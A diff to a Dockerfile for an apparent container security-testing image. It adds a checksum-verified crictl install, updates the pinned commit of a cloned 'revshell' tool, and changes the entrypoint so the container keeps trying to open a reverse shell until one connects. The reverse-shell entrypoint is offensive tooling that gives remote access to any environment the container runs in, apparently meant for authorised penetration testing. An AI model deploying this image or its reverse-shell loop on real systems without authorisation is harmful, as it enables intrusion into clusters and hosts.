@@ -96,8 +96,19 @@ RUN \
 	&& tar vxf rbac-lookup.tar.gz && install rbac-lookup /usr/local/bin/ \
 	&& rm rbac-lookup.tar.gz rbac-lookup LICENSE README.md
 
+# Setup of crictl
+ARG V_CRICTL="1.32.0"
+ARG H_AMD64_CRICTL="f050b71d3a73a91a4e0990b90143ed04dcd100cc66f953736fcb6a2730e283c4"
+ARG H_ARM64_CRICTL="f2f4e20658b72d00897f41e4b57093c8080e2d800ee894a5f4351f31d1833e30"
+RUN \
+	if [ "${TARGETARCH}" = "amd64" ]; then HASH="${H_AMD64_CRICTL}"; else HASH="${H_ARM64_CRICTL}"; fi \
+	&& curl -L -o crictl.tar.gz "https://github.com/kubernetes-sigs/cri-tools/releases/download/v${V_CRICTL}/crictl-v${V_CRICTL}-linux-${TARGETARCH}.tar.gz" \
+	&& echo "${HASH} crictl.tar.gz" | sha256sum --check \
+	&& tar vxf crictl.tar.gz && install crictl /usr/local/bin/ \
+	&& rm crictl.tar.gz crictl
+
 # Setup of revshell
-ARG C_REVSHELL="1668b040d68b4f7a66f8d10f64fb171fbbee950f"
+ARG C_REVSHELL="a8769305ce1da5cfbcc0e3c176150b96d11a6361"
 RUN \
 	git clone https://github.com/Doctor-love/revshell.git && cd revshell \
 	&& git reset --hard "${C_REVSHELL}" \
@@ -114,4 +125,4 @@ WORKDIR /home/userx
 USER userx
 
 # Establish reverse shell or sleep for infinity if CLI argument/environment variables aren't set
-ENTRYPOINT ["/bin/bash", "-c", "while true; do /usr/local/bin/revshell; sleep 3s; done"]
+ENTRYPOINT ["/bin/bash", "-c", "while true; do /usr/local/bin/revshell && break; sleep 3s; done"]
